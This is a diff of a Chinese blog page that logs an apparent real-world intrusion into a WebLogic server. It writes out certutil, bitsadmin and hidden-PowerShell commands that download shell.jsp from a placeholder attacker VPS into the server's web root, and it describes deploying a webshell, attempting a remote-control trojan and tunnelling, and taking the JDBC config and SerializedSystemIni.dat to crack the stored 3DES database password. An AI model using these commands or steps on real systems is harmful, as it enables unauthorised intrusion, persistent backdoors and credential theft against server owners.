@@ -22,7 +22,7 @@
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95&#x2F;5.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95&#x2F;6.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95&#x2F;7.png">
-<meta property="og:updated_time" content="2020-01-21T08:34:10.694Z">
+<meta property="og:updated_time" content="2020-02-10T03:02:19.621Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95&#x2F;1.png">
   
@@ -189,39 +189,62 @@
 
 <p>利用weblogic漏洞 上传webshell</p>
 <p><a href="http://xxx.xxx.xxx.xxx:7001/bea_wls_deployment_internal/test.jsp" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:7001/bea_wls_deployment_internal/test.jsp</a></p>
-<p>dir 找绝对路径</p>
-<p>D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war </p>
+<p>使用dir命令 找网站绝对路径</p>
+<p>查找发现网站绝对路径为：</p>
+<ul>
+<li>D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war </li>
+</ul>
 <p>远程命令执行</p>
-<p>下载</p>
-<p>cmd.exe /C “certutil.exe -urlcache -split -f <a href="http://vps服务器IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器IP:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp</p>
-<p>certutil.exe -urlcache -split -f <a href="http://vps服务器IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器IP:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp</p>
-<p>加引号等构造均无效</p>
-<p>bitsadmin /transfer myDownLoadJob /download /priority normal “<a href="http://vps服务器ip:8000/shell.jsp&quot;" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp&quot;</a> “D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp”</p>
-<p>bitsadmin /transfer d90f <a href="http://vps服务器ip:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp</p>
-<p>powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(‘<a href="http://vps服务器ip:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp</a> ‘,’D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp’)</p>
+<p>下载shell构造如下：</p>
+<ul>
+<li>cmd.exe /C “certutil.exe -urlcache -split -f <a href="http://vps服务器IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器IP:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp（失败）</li>
+</ul>
+<ul>
+<li>certutil.exe -urlcache -split -f <a href="http://vps服务器IP:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器IP:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp（失败）</li>
+</ul>
+<p>加引号等构造均失败：</p>
+<ul>
+<li>bitsadmin /transfer myDownLoadJob /download /priority normal “<a href="http://vps服务器ip:8000/shell.jsp&quot;" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp&quot;</a> “D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp”（失败）</li>
+</ul>
+<ul>
+<li>bitsadmin /transfer d90f <a href="http://vps服务器ip:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp</a> D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp （失败）</li>
+</ul>
+<ul>
+<li>powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile(‘<a href="http://vps服务器ip:8000/shell.jsp" target="_blank" rel="noopener">http://vps服务器ip:8000/shell.jsp</a> ‘,’D:\weblogic9\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_deployment_internal\gyuitk\war\s.jsp’) （失败）</li>
+</ul>
 <p>直接部署webshell</p>
 <p><a href="http://xxx.xx.xxx.xx:7001/1/2010.jsp" target="_blank" rel="noopener">http://xxx.xx.xxx.xx:7001/1/2010.jsp</a></p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/1.png" alt="img"></p>
-<p>内网3389开放 lcx执行失败 内网穿透执行失败</p>
+<p>拿到shell后  查看为内网主机  3389端口开放 </p>
+<p>使用lcx执行失败 内网穿透执行失败</p>
 <p>执行命令运行远控木马</p>
 <p>远控无法正常执行</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.png" alt="img"></p>
-<p>数据库配置文件</p>
-<p>D:/weblogic9/user_projects/domains/base_domain/config/jdbc/xxxjdbc-jdbc.xml</p>
+<p>找到数据库配置文件</p>
+<ul>
+<li>D:/weblogic9/user_projects/domains/base_domain/config/jdbc/xxxjdbc-jdbc.xml</li>
+</ul>
+<p>复制{3DES}XXXXXX 这串儿3DES加密密码</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/3.png" alt="img"></p>
-<p>user_projects\domains\base_domain\security\SerializedSystemIni.dat</p>
+<p>下载 user_projects\domains\base_domain\security\SerializedSystemIni.dat</p>
 <p>集齐两个文件</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.png" alt="img"></p>
-<p>获取数据库密码</p>
-<p>连接报错</p>
+<p>破解 获取数据库密码</p>
+<p>连接数据库报错</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.png" alt="img"></p>
 <p>查看数据配置文件 是否是驱动问题</p>
-<p>  <name>xxxjdbc</name></p>
-  <jdbc-driver-params>
-
-<p>​    <url>jdbc:sqlserver://127.0.0.1:1433</url></p>
-<p>​    <driver-name>com.microsoft.sqlserver.jdbc.SQLServerXADataSource</driver-name></p>
-<p>​    <properties></p>
+<ol>
+<li><p><name>xxxjdbc</name></p>
+</li>
+<li><jdbc-driver-params>
+</li>
+<li><p>​    <url>jdbc:sqlserver://127.0.0.1:1433</url></p>
+</li>
+<li><p>​    <driver-name>com.microsoft.sqlserver.jdbc.SQLServerXADataSource</driver-name></p>
+</li>
+<li><p>​    <properties></p>
+</li>
+</ol>
 <p>修改驱动配置</p>
 <p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.png" alt="img"></p>
 <p>成功连接数据库</p>
